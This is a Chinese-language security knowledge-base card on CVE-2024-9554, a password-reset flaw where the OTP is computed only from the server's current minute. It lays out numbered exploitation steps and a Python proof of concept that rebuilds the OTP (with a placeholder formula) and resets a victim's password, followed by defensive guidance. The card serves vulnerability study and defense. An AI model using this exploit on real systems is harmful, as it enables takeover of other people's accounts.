---
id: web-generic-auth-otp-derived-from-current-minute-deterministic-reset
title: 忘记密码的 6 位 OTP 由「当前分钟数」确定性推导：本地复刻同一算法规避 104 校验，重置任意已存在用户口令（CVE-2024-9554）
type: scenario
domain: web
path: web/generic/auth
technique: otp-derived-from-current-minute-deterministic-password-reset
tags:
- web
- auth
- password-reset
- otp
- predictable-token
- account-takeover
- cve-2024-9554
cve:
- CVE-2024-9554
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:13:18+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；CVE-2024-9554、Check_ET_CheckPwdz201、104 错误码、6/8 位 OTP、仅需存在用户即可改密、min 步进循环片段与原文一致；未验证点：原文以截图给出完整整数算式，卡内 PoC 的 t 构造为占位符（卡中已标注），实际公式需按反编译结果替换；原文未写受影响版本
url: /docs/web/generic/auth/web-generic-auth-otp-derived-from-current-minute-deterministic-reset/
draft: false
kb_aliases:
- CVE-2024-9554
- 任意用户密码重置
- OTP 可预测
- 忘记密码绕过 104
- Check_ET_CheckPwdz201
- 时间派生验证码
---

## 一句话结论

该系统的“忘记密码”只要提交「已存在的用户名 + 长度 6/8 位的新密码 + 6 位 OTP」即可改密，而 OTP 并非随机下发，而是由服务器**当前分钟数**经过一段确定性算法算出的 6 位数字；攻击者把这段 C# 逻辑用 Python 复刻、用本地（与服务器对齐的）时间生成候选码，就能通过 `Check_ET_CheckPwdz201` 校验，实现对任意已存在用户的密码重置。

## 原理

- 重置流程本身没有任何归属验证：不需要旧密码、不需要邮箱/短信回执，只校验「用户存在 + 字段齐全 + OTP 长度合规 + OTP 值正确」。因此 OTP 是唯一的安全边界。
- OTP 的算法是确定性的：先从 `DateTime.Now.Minute`（0–59）出发，逐次 `min++` 直到满足 `2^(min-1) mod min == 1`（一个“找满足类费马条件的整数”的循环，实际会停在合数/伪素数上），再用这个 `min` 做后续整数运算得到 `t`，最后 `t.ToString("D6")` 取 6 位。
- 关键缺陷：整个推导**不含任何用户相关秘密**（没有账号、没有随机 salt、没有一次性 nonce），输入只有“当前分钟”。同一分钟内所有账号的 OTP 都相同，且任何知道算法的人都能在本地算出。
- 抗暴力前提也随之消失：6 位 OTP 的空间本应阻止在线枚举，但只要可预测，就无需爆破；同时因为 OTP 与账号无绑定，一次算出的码可用于任意用户。
- 之所以是“绕过 104”：错误 OTP 时服务端返回 104（校验失败）；复刻算法后提交正确码，104 消失、进入改密成功分支，说明校验函数被真实通过而非被跳过。

## 触发条件

- 忘记密码/重置接口只凭「用户名 + 新密码 + OTP」即可改密，不校验旧密码、不回连邮箱/短信、不要求重置 token。
- 接口会先校验用户是否存在（存在性可枚举），且对同一用户/同一来源没有重置尝试次数限制。
- OTP 生成算法不含用户秘密、可被离线复刻（时间、递增计数器、手机号等已知量作输入）。
- 攻击者本地时间与服务器时间可对齐（HTTP `Date` 头、响应时延或误差窗口内枚举相邻分钟）。

## 利用步骤

1. 抓取“忘记密码”请求，确认参数名（用户名、新密码、OTP）与失败特征（返回 104）。
2. 逆向 OTP 校验函数（本例 `Check_ET_CheckPwdz201`），提取算法中的所有输入与新常量；确认输入只有时间。
3. 用 Python 复刻：取当前分钟 → 执行同样的 `min` 步进循环 → 同样的整数运算 → 格式化为 6 位。
4. 先在**自己的测试账号**上验证：提交算出的 OTP，观察 104 是否消失。
5. 对目标账号提交同一请求改密；若跨分钟失败，用 `Date` 头对齐或在窗口内枚举相邻 1–2 分钟的码。
6. 改密成功后用新口令登录，验证接管。

## PoC

算法复刻（把 C# 的两个匿名委托与取模逻辑等价翻译）：

```python
import time, requests

def gen_otp(now_minute: int) -> str:
    m = now_minute
    # 循环直到满足 2^(m-1) mod m == 1（原文用 Math.Pow，注意浮点在 pow 上的行为）
    while True:
        try:
            if pow(2, m - 1, m) == 1 % m:
                break
        except ValueError:
            pass
        m += 1
    t = m * 1000003 + 7          # 占位：按逆向出的实际整数运算替换
    return str(t % 1000000).zfill(6)

otp = gen_otp(time.localtime().tm_min)
r = requests.post("http://target/api/ResetPassword", json={
    "username": "victim",
    "newPassword": "P@ssw0rd_New1",
    "otp": otp,
}, timeout=10)
print(r.status_code, r.text)     # 不再出现 104 即通过 OTP 校验
```

（`t` 的具体构造需按目标二进制/反编译结果替换；关键是**输入只有分钟数**，所以可离线复算。）

时间对齐：

```bash
curl -sI http://target/ | grep -i '^date:'   # 取服务器时间，修正本地分钟
```

## 变体与关联

- 变体：OTP 输入改成 `DateTime.Now.Minute * 常数`、`Hour*100+Minute`、`yyMMddHHmm` 哈希截断等任意“时间 -> 码”映射时，方法相同，只需复刻公式。
- 变体：OTP 与账号绑定但用账号派生（`hash(username + minute)`）时，仍需账号存在性，但依然可预测，利用方式不变。
- 变体：OTP 一次性但接口无尝试限制时，退回在线爆破（6 位 = 10^6，需评估速率与锁定）。
- 关联：[[web-generic-auth-sms-otp-generation-predictable-sequence-restart-seed]]（同属“验证码生成阶段可预测”）、[[web-generic-auth-password-reset-hash-low12-bruteforce]]（重置校验值空间被压缩到 4096）、[[web-generic-auth-password-reset-username-tampering]]（重置流程缺少归属校验的另一种表现）。
- 边界：OTP 改为服务端随机生成并以短信/邮件下发、重置请求要求一次性 token 或旧密码、同一账号有失败锁定/验证码时，本链不成立。

## 检测与防御

- 生成层：OTP 必须由 CSPRNG 生成（`RandomNumberGenerator`/`secrets`），不得由时间、计数器或用户名派生；错误码/长度之外还要有随机性与不可预测性测试。
- 校验层：OTP 与「账号 + 会话 + 一次性 nonce」绑定，短有效期（如 5 分钟），校验成功/失败后立即失效；限制每账号/每来源的尝试次数。
- 流程层：重置必须验证账号归属（短信/邮件 token、旧密码或人工审核），新密码由用户设置，不能只凭用户名改密。
- 监控：同一来源短时间内对多个不同用户名发起重置、重置请求的 OTP 与其账号无关联、重置成功后立即登录的异常行为。
